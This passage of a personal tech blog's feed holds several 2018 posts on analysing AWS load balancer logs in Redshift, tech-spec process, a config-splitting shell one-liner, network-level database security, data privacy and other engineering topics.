	<span class="n">requestip_port</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">22</span><span class="p">),</span>
	<span class="n">backendip_port</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">22</span><span class="p">),</span>
	<span class="n">requestprocessingtime</span> <span class="nb">double</span> <span class="nb">precision</span> <span class="n">encode</span> <span class="n">bytedict</span><span class="p">,</span>
	<span class="n">backendprocessingtime</span> <span class="nb">double</span> <span class="nb">precision</span> <span class="n">encode</span> <span class="n">bytedict</span><span class="p">,</span>
	<span class="n">clientresponsetime</span> <span class="nb">double</span> <span class="nb">precision</span> <span class="n">encode</span> <span class="n">bytedict</span><span class="p">,</span>
	<span class="n">elbresponsecode</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span>
	<span class="n">backendresponsecode</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span>
	<span class="n">receivedbytes</span> <span class="nb">bigint</span><span class="p">,</span>
	<span class="n">sentbytes</span> <span class="nb">bigint</span><span class="p">,</span>
	<span class="n">httprequest</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">5083</span><span class="p">),</span>
	<span class="n">useragent</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">500</span><span class="p">),</span>
	<span class="n">ssl_cipher</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">40</span><span class="p">),</span>
	<span class="n">ssl_protocol</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>
<span class="p">)</span>
<span class="n">sortkey</span><span class="p">(</span><span class="n">requesttime</span><span class="p">);</span>

<span class="c1">-- ALB Logs</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">alb_logs</span> <span class="p">(</span>
 <span class="k">type</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span>
 <span class="n">requesttime</span> <span class="nb">timestamp</span><span class="p">,</span>
 <span class="n">elb</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
 <span class="n">client_and_port</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">24</span><span class="p">),</span>
 <span class="n">target_and_port</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">24</span><span class="p">),</span>
 <span class="n">request_processing_time</span> <span class="nb">double</span> <span class="nb">precision</span> <span class="n">encode</span> <span class="n">bytedict</span><span class="p">,</span>
 <span class="n">target_processing_time</span> <span class="nb">double</span> <span class="nb">precision</span> <span class="n">encode</span> <span class="n">bytedict</span><span class="p">,</span>
 <span class="n">response_processing_time</span> <span class="nb">double</span> <span class="nb">precision</span> <span class="n">encode</span> <span class="n">bytedict</span><span class="p">,</span>
 <span class="n">elb_status_code</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span>
 <span class="n">target_status_code</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span>
 <span class="n">received_bytes</span> <span class="nb">bigint</span><span class="p">,</span>
 <span class="n">sent_bytes</span> <span class="nb">bigint</span><span class="p">,</span>
 <span class="n">request</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">5000</span><span class="p">),</span>
 <span class="n">user_agent</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">500</span><span class="p">),</span>
 <span class="n">ssl_cipher</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">500</span><span class="p">),</span>
 <span class="n">ssl_protocol</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
 <span class="n">target_group_arn</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
 <span class="n">trace_id</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
 <span class="n">domain_name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
 <span class="n">chosen_cert_arn</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
 <span class="n">matched_rule_priority</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span>
 <span class="n">request_creation_time</span> <span class="nb">timestamp</span><span class="p">,</span>
 <span class="n">actions_executed</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
 <span class="p">)</span> <span class="n">sortkey</span><span class="p">(</span><span class="n">requesttime</span><span class="p">);</span>
 </code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Type 1 and Type 2 tech specs</title>
   <link href="http://dangoldin.com/2018/06/01/type-1-and-type-2-tech-specs/"/>
   <updated>2018-06-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/06/01/type-1-and-type-2-tech-specs</id>
   <content:encoded><![CDATA[
<p>Every year since Amazon went public, Jeff Bezos writes an insightful and penetrating shareholder letter that covers a variety of business topics driving Amazon’s success. In 2015 he wrote about Type 1 and Type 2 decisions:</p>

<blockquote>
  <p>We want to be a large company that’s also an invention machine. We want to combine the extraordinary customer-serving capabilities that are enabled by size with the speed of movement, nimbleness, and risk-acceptance mentality normally associated with entrepreneurial start-ups.</p>
</blockquote>

<blockquote>
  <p>Can we do it? I’m optimistic. We have a good start on it, and I think our culture puts us in a position to achieve the goal. But I don’t think it’ll be easy. There are some subtle traps that even high-performing large organizations can fall into as a matter of course, and we’ll have to learn as an institution how to guard against them. One common pitfall for large organizations – one that hurts speed and inventiveness – is “one-size-fits-all” decision making.</p>
</blockquote>

<blockquote>
  <p>Some decisions are consequential and irreversible or nearly irreversible – one-way doors – and these decisions must be made methodically, carefully, slowly, with great deliberation and consultation. If you walk through and don’t like what you see on the other side, you can’t get back to where you were before. We can call these Type 1 decisions. But most decisions aren’t like that – they are changeable, reversible – they’re two-way doors. If you’ve made a suboptimal Type 2 decision, you don’t have to live with the consequences for that long. You can reopen the door and go back through. Type 2 decisions can and should be made quickly by high judgment individuals or small groups.</p>
</blockquote>

<blockquote>
  <p>As organizations get larger, there seems to be a tendency to use the heavy-weight Type 1 decision-making process on most decisions, including many Type 2 decisions. The end result of this is slowness, unthoughtful risk aversion, failure to experiment sufficiently, and consequently diminished invention.1 We’ll have to figure out how to fight that tendency.</p>
</blockquote>

<blockquote>
  <p>And one-size-fits-all thinking will turn out to be only one of the pitfalls. We’ll work hard to avoid it… and any other large organization maladies we can identify.</p>
</blockquote>

<p>This has stuck with me over the years and I often com back to it. Lately I’ve been thinking about how this fits in with tech specs. As our applications become more complicated it becomes more important to take the time to think about the impact new code will have and tech specs help clarify that thinking, highlight risks, and get buying from everyone involved. At the same time it’s very easy to get carried away and spend so much time moving things around with actually pushing anything forward.</p>

<p>This is where the Type 1 vs Type 2 approach makes sense. Critical components warrant the extra diligence but many features would benefit from a more iterative approach. The entire Agile development process is designed around getting features built and quickly iterating to get closer to the ideal. Microservices also fit into this idea - by splitting your application into many small components you can work on each one independently without having to worry what impact it will have on the others.</p>

<p>The key question is determining what feature or improvement need a Type 1 spec and which can settle for a Type 2. This is where experience and context are extremely valuable. Many experienced engineers have an intuitive feel for what’s going to be risky and warrants a deeper dive and spend the extra effort there. As engineering teams grow they introduce additional process in order to protect against the edge case but that cost is incurred in every other case that would have benefited from a looser process.</p>

<p>Finding that sweet spot is how you find the balance between moving quickly and moving safely. Amazon’s growth has been incredible and their ability to maintain this mindset is even more impressive.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Power of shell commands</title>
   <link href="http://dangoldin.com/2018/05/26/power-of-shell-commands/"/>
   <updated>2018-05-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/05/26/power-of-shell-commands</id>
   <content:encoded><![CDATA[
<p>It’s surprising how unappreciated shell commands are. They’re incredibly powerful and once understood are able to handle small one-off tasks much quicker than writing even simple scripts. Earlier this week I ran into a small task that highlights the power and ability of the shell.</p>

<p>A few of our applications use the same configuration file which contains a variety of URLs, secrets, and passwords. If any of these applications require a field the it gets added to this growing configuration file. This is clearly not good for security and as part of a larger security revamp we’re moving to application-specific config files. Long term we want to revamp the way we do deploys such that the configuration is kept in environment variables and handled by the build system but as a short term solution we want to split this single configuration file into a file per application.</p>

<p>The solution is straightforward - go through the config reader code of each application, extract the keys, and then find them in the main configuration file. Easy to explain but parsing files is fickle and not very interesting. Luckily for us with a few shell commands we can do exactly what we need to do. We use the cut command and a few pipes to extract the keys from the config reading file and then combine it with the join command to get the intersection. A one liner is all that’s needed to give us the application specific config file.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">join</span> <span class="nt">-t</span><span class="s1">'='</span> &lt;<span class="o">(</span> <span class="nb">grep</span> <span class="s1">'\$configObj'</span> code/application/config/reader.php | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'('</span> <span class="nt">-f3</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s2">"'"</span> <span class="nt">-f2</span> | <span class="nb">sort</span> <span class="o">)</span> &lt;<span class="o">(</span> <span class="nb">sort</span> ~/config.properties <span class="o">)</span></code></pre></figure>

<p>Shell commands are simple but it’s the ability to chain them together that gives us an incredible set of tools. We’re often tempted to write a simple script but it’s very likely that it’s possible to do the same with a series of shell commands and pipes.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Memory as a stack</title>
   <link href="http://dangoldin.com/2018/05/14/memory-as-a-stack/"/>
   <updated>2018-05-14T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/05/14/memory-as-a-stack</id>
   <content:encoded><![CDATA[
<p>While the title is using two technical terms the post is actually about human memory - my memory. I’m not sure if it’s just me but lately my short term memory has been behaving like a stack. I’m working on something and then an interruption new comes along which suddenly gets pushed to the top of the stack. Now I’m working on this intrusion and when that’s done I hopefully remember my previous task so I can resume until it’s either done or the next task comes along and gets pushed to the top again.</p>

<p>The modern world has encouraged this mindset and approach with constant interruptions. It’s more difficult to stay focused on the task at hand. We take breaks to check our email or browse a social media app and we’re adopting that approach to more serious work. As I write this post I have to resist the urge to take a break but at least I’m self aware enough to catch my subconscious in the act.</p>

<p>Rather than treating our short term memory as a stack we should be treating it as a priority queue. Then the important pieces stick around and the interruptions get forgotten. Unfortunately we’ve trained ourselves to do the exact opposite and something we need to actively train ourselves to avoid.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Curse of the early adopter</title>
   <link href="http://dangoldin.com/2018/05/12/curse-of-the-early-adopter/"/>
   <updated>2018-05-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/05/12/curse-of-the-early-adopter</id>
   <content:encoded><![CDATA[
<p>Yesterday I spent a bit of time getting Ansible setup for my various instances that host my various projects. There are a handful scattered across AWS and Digital Ocean and I go through a round of maintenance every few months where I upgrade everything that needs upgrading. This was rare enough that I never bothered automating it but had half an hour to spare and thought this was an opportunity to learn Ansible - something that the TripleLift DevOps team has been using.</p>

<p>Turns out it was surprisingly easy and I only wish I had done it sooner. The documentation is great and it’s mature enough that there are tons of examples for whatever scenario one may encounter. The fact that my use case was simple didn’t hurt but I suspect even a more complicated one would have some examples.</p>

<p>But the only reason it was so easy was because I was such a late adopter. Ansible was initially released in 2012 and it’s grown significantly since then. Had I adopted it when it launched I would have had to figure everything out the hard way. More importantly, once I got it working I doubt I’d revisit later versions to see the latest improvements. That’s the curse of the early adopter - it takes you a while to get everything working in a ramshackle way that it takes massive amounts of discipline to actually change your implementation once the software improves. It’s likely that you may not even know what the improvements were or how they can be applied.</p>

<p>This is akin to tech debt but rather than living within your own code that you’re intimately familiar with it’s with foreign code that’s rarely checked or referenced. Upgrading it carries risks and we subscribe to the policy of “if it ain’t broke, don’t fix it’ - which may very well be the correct choice but it’s important to know the tradeoffs which don’t happen with only half the information. The lesson here is if you use open source tools and libraries subscribe to their release notes and keep an open mind - it’s likely the improvements will benefit you and your code. Even better would be to contribute back to the community and build whatever needs building.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Rise of microbrands</title>
   <link href="http://dangoldin.com/2018/04/28/rise-of-microbrands/"/>
   <updated>2018-04-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/04/28/rise-of-microbrands</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/instagram-optimum-ad.png" alt="Optimum Instagram ad" width="750" height="1334" layout="responsive"/>

<p>While browsing Instagram the other day I saw an ad for Optimum. Despite it being for Optimum the ad showed a sports clip that could have just as easily been on a highlight real or a a trailer for a sports movie. In fact, if it weren’t associated with Optimum maybe I would have even clicked on it.</p>

<p>Having a strong brand is incredibly valuable - think Coca Cola. A weak brand (think amy ISP), on the other hand, is incredibly damaging. If a company has a strong brand they should definitely flaunt it but I’m surprised that in this day and age poorly branded companies still operate under their primary brand. There’s nothing stopping them from launching dozens of unique brands each designed to appeal to a particular audience.</p>

<p>They’d still be able to leverage the underlying infrastructure but the differences would be on the way it’s presented to customers. This would range from the way the product is marketed and advertised to the way the website is designed.</p>

<p>We’ve already seen something similar in retail with major brands having a variety of subsidiaries. The best example is <a href="https://en.wikipedia.org/wiki/Gap_Inc.">Gap</a>. In addition to Gap, it also owns Old Navy, Banana Republic, Athleta, and Intermix. Gap could have marketed each of them under its own mantle but given the audience it made a lot more sense to let each brand manage itself. I don’t know how much of the Gap infrastructure each of the subsidiaries leverages and Gap may very well be just a holding company but in that case efficiens are lost. Gap should leverage its size to get discounted rates on everything it uses - ranging from the raw materials used for clothing to improved shipping rates to improved advertising rates.</p>

<p>Similarly, Anheuser-Busch InBev owns more than <a href="https://en.wikipedia.org/wiki/Anheuser-Busch_InBev">500 beer brands</a>. Budweiser is the ultimate Anheuser-Busch beer but so are Hoegaarden, Shock Top, and Blue Point. They’ve each managed to maintain their own brand and reputation while taking advantage of the Anheuser-Busch InBev infrastructure.</p>

<p>For modern internet brands it is easier than ever to push towards a world where every customer has their own brand. It is extreme and unlikely but it’s inevitable that we see an increase in these microbrands that are designed to go after specific customer segments. I’m constantly surprised by how many startups there are <a href="https://www.buzzfeed.com/iknowkayleen/slumber-party?utm_term=.fogE7AvJRd#.mwRBN9MJvO">selling mattresses</a> and this is only the start.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Connect Four bot competition</title>
   <link href="http://dangoldin.com/2018/04/25/connect-four-bot-competition/"/>
   <updated>2018-04-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/04/25/connect-four-bot-competition</id>
   <content:encoded><![CDATA[
<p>Years ago when I worked at Yodle the engineering team held a Connect Four bot competition. The goal was for each person to write a Connect Four playing bot and then let them loose to determine the winner. We had either a few days or a few weeks to do this and my failed approach was to use genetic programming to evolve a bot. The best it did was beat a completely random bot 80% of the time while the winning entry leveraged Minimax with Alpha Beta Pruning.</p>

<p>That’s all in the past but earlier this week we held a quarterly kickoff and one of the more recent traditions is to have a short coding activity so I thought of running a mini Connect Four competition. Since we only had a bit of time I needed to make it as easy for everyone to get started as possible so I wrote up a <a href="https://github.com/dangoldin/connect-four">simple framework</a> to make it easy to run a Connect Four competition. The code comes with four different applications: a server application that manages the game, a bot client in Python, a bot client in JavaScript, and a React UI to visualize the game. The first three were simple to write but the React UI involved finding <a href="https://codepen.io/jeffleu/pen/KgbZwj">Jeff Leu’s great example</a> on CodePen and adapting it from an interactive game session to a game visualization.</p>

<p>There’s some nuance around getting the appropriate libraries and dependencies set up but it’s a neat activity that gets everyone thinking. A big thing that the code would benefit from is some utility functions around managing state and determining winners since that’s boilerplate that everyone would need to write. This code exists in the server application but didn’t make its way into the client since I wanted to keep the JavaScript and Python clients comparable.</p>

<p>If you end up giving this a try I’d love to know how it went.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Secure at the network level</title>
   <link href="http://dangoldin.com/2018/04/17/secure-at-the-network-level/"/>
   <updated>2018-04-17T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/04/17/secure-at-the-network-level</id>
   <content:encoded><![CDATA[
<p>Two weeks ago Travis CI published a <a href="https://blog.travis-ci.com/2018-04-03-incident-post-mortem">postmortem</a> describing an outage that was caused by a script that truncated all tables on a production database. The script was designed to run against a test database but instead ended up wiping the production one. The remediation steps highlighted are a great start but I’m surprised they didn’t pick the most obvious one - protect systems at the network level.</p>

<p>Relying on confirmation steps, user permissions, and unique credentials per environment are great steps and should be best practices but they don’t actually stop malicious or accidental behavior. They reduce the risk by adding more friction but it’s still possible to circumvent these blocks.</p>

<p>The way to eliminate these types of issues is to not rely on hoops but get rid of the loophole entirely. In the scenario above, the database should block traffic from all IPs that have not been whitelisted. And the whitelisted IPs should belong to production applications that need access to the system. In turn, these applications should not allow any SSH access to prevent someone from tunneling through. The way this is done in AWS is by using security groups and giving them the least allowable permissions while still allowing them to function properly. Exceptions can be made but they should be temporary and overseen by more than a single person to avoid any problems.</p>

<p>This sounds draconian but by investing in this approach up front you end up with a much stronger system in the long term that you don’t have to revamp to secure. And since doing this manually is a huge pain you end up investing in tools, such as <a href="https://www.terraform.io/">terraform</a>, that make these rules much simpler to manage.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Load testing</title>
   <link href="http://dangoldin.com/2018/04/12/load-testing/"/>
   <updated>2018-04-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/04/12/load-testing</id>
   <content:encoded><![CDATA[
<p>I started writing this post about using Siege to do load testing but got carried away and ended up discovering how much I don’t know. In particular, I ended up stumbling unto Gil Tene’s talk on measuring latency and how nearly every tool gets it wrong due to the bias in the tools themselves. The general idea is that most tools measure service time rather than request time. Service time is how long it takes your application to handle a request while request time is the time it takes for the user to receive a response. The former is from the perspective of the application but the latter is from the perspective of the caller.</p>

<p>A good way to think about it is to imagine your application can handle 10 requests a second but also comes with an infinite request queue. If the queue is empty 10 requests will be handled immediately, otherwise the queue will start to fill up. Service time will measure how long it takes your application to handle a task once it’s off the queue but the request time is measured from the time the task was put on the queue - with no load they’re the same but as soon as load increases the request time blows up.</p>

<p>It’s a fascinating talk and if you’re at all interested in load testing your applications it’s well worth watching:</p>

<amp-youtube data-videoid="lJ8ydIuPFeU" layout="responsive" width="640" height="480"></amp-youtube>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Open sourcing self driving car data</title>
   <link href="http://dangoldin.com/2018/04/03/open-sourcing-self-driving-car-data/"/>
   <updated>2018-04-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/04/03/open-sourcing-self-driving-car-data</id>
   <content:encoded><![CDATA[
<p>There’s a rush by the world’s largest companies to develop the first fully self driving car. The investment so far has been insane and it’s only the start. It’s one of those problems that get more and more difficult to solve the closer they are to the finish. The upside is so large that it also leads to some perverse behavior in order to get any advantage - the Uber/Waymo lawsuit comes to mind here.</p>

<p>The space is competitive and everyone has an incentive to be first. At the same time the sooner we have self driving cars the more lives are saved. That’s a big reason for the worlds’ governments to encourage self driving technology to improve as quickly as possible. Something that I’ve been pondering is the idea of using <a href="https://en.wikipedia.org/wiki/Prizes_as_an_alternative_to_patents">prizes instead of patents</a> to encourage innovation. This is an idea attributed to Joseph Stiglitz and focuses on incentivizing research areas where patents don’t offer a good enough incentive. The self driving car space doesn’t have this incentive problem but the playing field isn’t level and it’s big company competing against big company. What if governments offered prize money for various stages of self driving car achievement but in return the winners needed to share their data?</p>

<p>Governments allow these cars to drive on public roads but in return I’d love to see governments mandate that these companies start sharing their data. This would allow lower resourced companies to benefit and get a jump start without the massive initial outlay necessary. There should be an advantage for the first comers so the data release can be delayed but having a shared data reserve will help society as a whole get to self driving cars sooner - a goal worth paying for.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Protecting data ouside of a Terms of Service</title>
   <link href="http://dangoldin.com/2018/03/25/protecting-data-ouside-of-a-terms-of-service/"/>
   <updated>2018-03-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/03/25/protecting-data-ouside-of-a-terms-of-service</id>
   <content:encoded><![CDATA[
<p>Since the Facebook/Cambridge Analytica news broke I’ve been thinking about how a company can make private data available without depending on a terms of service to enforce its usage or retention. As we’ve seen, terms of service are easily ignored and it may take years to notice that your data has been compromised.</p>

<p>The only way of securely sharing data with third parties is to not actually give it to them. That seems like a contradiction but there is a way out. Rather than shipping your data to them you instead have them provide their code to you. Their code can then run within your walls and you’re able to audit it to make sure it’s working as promised. This means giving third party developers a limited set of methods that can be used and preventing any but the most minimal data from leaving the system. That means as a developer you’re working in somewhat of a black box since even debugging gets difficult. In addition, as the platform you’re incurring the additional cost of hosting and executing these third party applications.</p>

<p>Maybe it can be structured in such a way that the developers pay you for the computing they use but that seems like a tough sell. As I write this it seems similar to writing a smartphone app: you’re limited to a finite set of APIs and need permissions from the users for nearly everything. In fact, our system would be even more restrictive since you would not be able to access any of the secured data. It would be akin to writing an app for the Apple App Store but not being able to use your own database - instead you would write your app to depend on a database that Apple provided that you would not be able to access.</p>

<p>This is a ton of hoops to jump through but unfortunately feels as if it’s the only way to have some form of data portability - at least in spirit.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Facebook's "breach"</title>
   <link href="http://dangoldin.com/2018/03/18/facebooks-breach/"/>
   <updated>2018-03-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/03/18/facebooks-breach</id>
   <content:encoded><![CDATA[
<p>The big news this weekend was that Facebook suspended Cambridge Analytica, a company that leveraged behavioral data to come up with very focused and accurate political ads, for using data that they were not supposed to have as well as not deleting it when caught. Everyone seems to be surprised by this revelation but I’m honestly surprised it took this long and I wouldn’t be surprised if there are still hundreds, or even thousands, of companies in the same situation as Cambridge Analytica, albeit at a smaller scale.</p>

<p>The value of this data is immense and Facebook made it incredibly easy to access. It’s no surprise that some unsavory actors pulled this data and used it for whatever they needed to. And once you have the data why delete it? It’s not as if there’s any way to get caught and if you do you can just delete it then. If you’re competitors are doing this you also have a big incentive to play along and do the same thing. It’s tough being noble while you’re competitors are running amok, especially if the risk of getting caught is low.</p>

<p>Facebook is right in saying it’s not a security breach - there was no hack and the data was properly fetched via the official API. It is a violation of Facebook’s terms of service but the damage has already been done. Coupled with the privacy initiatives happening in Europe it does feel as if the world is starting to take privacy seriously. Unfortunately it looks as if we’re going to need more of these fiascos before we get to where we need to be.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Crowdsourced data</title>
   <link href="http://dangoldin.com/2018/03/11/crowdsourced-data/"/>
   <updated>2018-03-11T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/03/11/crowdsourced-data</id>
   <content:encoded><![CDATA[
<p>Open source has become a critical part of modern software development that allows small teams to move quickly and do in months what used to take years. This has been driven by massive platforms, such as GitHub, that make it extremely easy to find useful code, contribute back, and provide feedback, comments, and requests.</p>

<p>Unfortunately, data hasn’t seen as strong of an open sourcing trend. There are a few sites - ranging from <a href="https://www.data.gov/developers/open-source">data.gov</a> for government data to various <a href="https://github.com/awesomedata/awesome-public-datasets">aggregators</a> that offer various datasets for download but the formats are inconsistent and some even come in PDF. There just hasn’t been a single open data standard that’s been globally adopted. Instead we have cities offering PDF and CSV files for download and companies offering throttled APIs to their proprietary data.</p>

<img src="http://dangoldin.com/assets/static/images/parental-leave-in-tech.png" width="2392" height="1418" alt="Parental leave in tech" layout="responsive"/>

<p>Things are heading in the right direction and I only wish it was quicker. A recent trend that I’ve been a big fan of is people editing and collaborating on a Google spreadsheet that’s designed to provide transparency for a topic. The most recent example I discovered is “<a href="https://docs.google.com/spreadsheets/d/1GKWqhc3FVtSVKRZNBxyfwZ_QrB1f-i1T0-yBJ6X_YHM/edit#gid=0">parental leave in tech</a>.” It’s a simple crowdsourced spreadsheet that lists the parental leave policies for various tech companies. If you wanted the information about one company I’m sure you’d be able to find it on the web but there was nothing that consolidated the information into a single document.</p>

<p>While contributing to open source code generally requires some coding ability none of that is required to add or modify a few cells of a spreadsheet. Because of that low barrier the formatting may end up inconsistent but that will just be fixed by someone else later. Creating a Google spreadsheet to collect data isn’t very valuable unless others are contributing and that’s gotten much easier. I discovered the parental leave spreadsheet using Twitter which massively lowers distribution costs and if something is both valuable and easy to contribute to it ends up quickly amassing a ton of data.</p>

<p>These spreadsheets so far have been more tech focused but inevitably they will move beyond tech and into the mainstream. I can’t wait.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Hunting for my old GeoCities site</title>
   <link href="http://dangoldin.com/2018/03/03/hunting-for-my-old-geocities-site/"/>
   <updated>2018-03-03T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/03/03/hunting-for-my-old-geocities-site</id>
   <content:encoded><![CDATA[
<p>One of my first exposures to the web was geocities and I recall creating a site on GeoCities under the “Cape Canaveral” space. And I only remembered that when I stumbled across <a href="http://www.oocities.org/">OoCities.org</a> and saw the name. Being a kid I was really into space and astronomy and created my GeoCities within that space. I keep trying to find my page but am constantly disappointed when every attempt ends in failure - although you do run into some amazing sites from the early years of the web.</p>

<p>It’s amazing how our memories work. I barely remember anything about my site other than that I had an animated gif genie on the homepage, an off-yellow-orange background, and the fact that I took full advantage of <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame">frames</a> (not iframes) and <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frameset">framesets</a>. I have no idea what i wrote about or any of the text which makes existing search tools nearly useless. And so I go on getting a bout of nostalgia every couple of days that gives me the motivation to keep exploring the ancient corners of the web.</p>

<p>I’m not quite there yet but I suspect the last step will be just downloading the full 652 GB archive and attempting a bunch of different shell commands and scripts to try to find my site. I would have already done this if I were able to download the archive but unfortunately just don’t have the space. In this case using AWS to spin up an instance just to download and extract the Cape Canaveral data might be worth it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Retrieving Kindle highlights</title>
   <link href="http://dangoldin.com/2018/02/25/retrieving-kindle-highlights/"/>
   <updated>2018-02-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/02/25/retrieving-kindle-highlights</id>
   <content:encoded><![CDATA[
<p>At this point I’ve moved most the majority of my reading to a Kindle. If I want to read a book I’ll only get a physical version if the Kindle version is unavailable. It’s often cheaper, immediately available, takes up no space, and comes with a variety of annotation abilities. My biggest frustration has been how difficult it’s been to export my highlights. I will often highlight interesting passages and quotes and every few weeks will dump them into a <a href="https://github.com/dangoldin/quotes/blob/master/quotes.txt">giant text file</a> that I will occasionally reference or search.</p>

<p>I wish I could simply export all my highlights into a single file. Instead, the best way I’ve found so far is to use the Kindle Notes and Highlights section and manually copy and pasting them over while removing the unnecessary text captured in the selection. It’s not too terrible since I can at least fetch them in bulk but I wish there was a more automated way. Given how API centric AWS is I’m surprised this hasn’t translated into Amazon’s other products. Building a strong Kindle ecosystem is a great way to improve the overall product and make it that much more costly to switch and building a proper API is the first step.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Analyzing AWS ELB logs</title>
   <link href="http://dangoldin.com/2018/02/20/analyzing-aws-elb-logs/"/>
   <updated>2018-02-20T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/02/20/analyzing-aws-elb-logs</id>
   <content:encoded><![CDATA[
<p>Logging HTTP requests should be enabled for every application you run. When things go wrong, and they will, it’s often the first step to understand the problem. Unfortunately, logging isn’t always top of mind and is often forgotten. Luckily, if you use the Elastic Load Balancer (ELB) functionality within AWS you’re able to set up ELB logs that track every request and write it to an S3 bucket. The documentation is up on the <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/classic/access-log-collection.html">Amazon site</a> but there’s a surprising amount of information that’s hidden away in the logs. Since it’s Amazon and they want to make it as easy for you to use their various services together it’s simple to load the logs into Redshift and start digging into them via some basic queries.</p>

<p>I wanted to highlight a few I used in the past couple of weeks to dig into an issue. Despite having a centralized logging system I still find it easier to just write SQL queries - it’s significantly more expressive than any log exploration tool I’ve used and allows me to exactly what I without any magic.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="c1">-- Load the data into Redshift</span>
<span class="k">copy</span> <span class="n">elb_logs</span>
<span class="k">from</span> <span class="s1">'s3://logdirs/.../us-east-1/2018/02/19/'</span>
<span class="n">COMPUPDATE</span> <span class="k">OFF</span> <span class="n">CREDENTIALS</span> <span class="s1">'aws_access_key_id=KEY;aws_secret_access_key=SECRET'</span>
<span class="k">delimiter</span> <span class="s1">' '</span>
<span class="n">TIMEFORMAT</span> <span class="k">as</span> <span class="s1">'auto'</span>
<span class="n">ACCEPTINVCHARS</span>
<span class="n">REMOVEQUOTES</span>
<span class="n">FILLRECORD</span>
<span class="n">MAXERROR</span> <span class="k">as</span> <span class="mi">100000</span><span class="p">;</span>

<span class="c1">-- Look at the distribution of ELB status codes</span>
<span class="k">select</span> <span class="n">elbresponsecode</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span>
<span class="k">from</span> <span class="n">elb_logs</span>
<span class="k">group</span> <span class="k">by</span> <span class="n">elbresponsecode</span>
<span class="k">order</span> <span class="k">by</span> <span class="n">elbresponsecode</span><span class="p">;</span>

<span class="c1">-- Look at the distribution of backend status codes</span>
<span class="k">select</span> <span class="n">backendresponsecode</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span>
<span class="k">from</span> <span class="n">elb_logs</span>
<span class="k">group</span> <span class="k">by</span> <span class="n">backendresponsecode</span>
<span class="k">order</span> <span class="k">by</span> <span class="n">backendresponsecode</span><span class="p">;</span>

<span class="c1">-- Look at distribution by both</span>
<span class="k">select</span> <span class="n">elbresponsecode</span><span class="p">,</span> <span class="n">backendresponsecode</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span>
<span class="k">from</span> <span class="n">elb_logs</span>
